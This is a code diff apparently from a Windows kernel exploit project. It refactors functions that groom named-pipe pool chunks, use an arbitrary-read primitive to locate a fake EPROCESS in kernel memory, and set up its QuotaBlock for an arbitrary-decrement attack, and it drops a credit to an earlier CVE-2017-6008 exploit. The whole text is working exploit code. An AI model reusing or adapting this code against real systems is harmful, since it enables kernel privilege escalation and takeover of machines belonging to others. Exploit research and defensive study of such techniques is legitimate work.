@@ -83,40 +83,31 @@ int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
 
 uintptr_t allocFakeEprocess(exploit_pipes_t* pipes, exploit_addresses_t* addrs, char* fake_eprocess_buf)
 {
-    // Write fake EPROCESS data to the previous chunk pipe, creating a new pipe queue entry in NonPagedPoolNx
+    // Write fake EPROCESS data to the previous chunk pipe, creating a linked pipe queue entry
     WriteDataToPipe(&pipes->previous_chunk_pipe, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
 
-    // Calculate the address of the previous chunk's pipe_queue_entry
+    // Calculate address of the previous chunk's pipe_queue_entry
     uintptr_t prev_vs_chunk_addr = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
     uintptr_t prev_pipe_queue_entry_addr = prev_vs_chunk_addr + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER);
 
-    // Get the address of the newly created pipe_queue_entry by reading the Flink of the previous entry
+    // Get address of the new pipe_queue_entry via Flink
     uintptr_t new_pipe_queue_entry_addr;
     ArbitraryRead(&pipes->ghost_chunk_pipe, prev_pipe_queue_entry_addr + offsetof(LIST_ENTRY, Flink), (char*)&new_pipe_queue_entry_addr, 0x8);
 
-    // Calculate the start address of the data buffer in the new pipe_queue_entry
-    // The fake EPROCESS structure is located within this data buffer
-    uintptr_t pipe_queue_data_start = new_pipe_queue_entry_addr + offsetof(pipe_queue_entry_t, data);
-
-    // Return the exact address of the fake EPROCESS structure within the pipe queue data buffer
-    return pipe_queue_data_start + FAKE_EPROCESS_OFFSET;
+    // Return the address of the fake EPROCESS within the new pipe queue data buffer
+    return new_pipe_queue_entry_addr + offsetof(pipe_queue_entry_t, data) + FAKE_EPROCESS_OFFSET;
 }
 
 int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
 {
-
-    /* initFakeEprocess
-    from: https://github.com/cbayet/Exploit-CVE-2017-6008/blob/95ee99c7/Win10/src/CVE-2017-6008_Win10_Exploit.cpp#L205-L232*/
     memset((PVOID)fake_eprocess_buf, 0x41, FAKE_EPROCESS_SIZE);
 
     PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + FAKE_EPROCESS_OFFSET);
 
-    memset((char*)addr - 0x40, 0xA, 0x40);
-    memset((char*)addr - 0x18, 0xB, 0x1);
+    // Pcb.Header.Type
+    memset((char*)addr + EPROCESS_TYPE_OFFSET, 0x3, 1);
 
-    memset(addr, 0x3, 1);
-
-    // Set address to decrement in fake structure
+    // QuotaBlock: Set address to decrement in fake structure
     memcpy((char*)addr + EPROCESS_QUOTA_BLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));
 
     return 1;
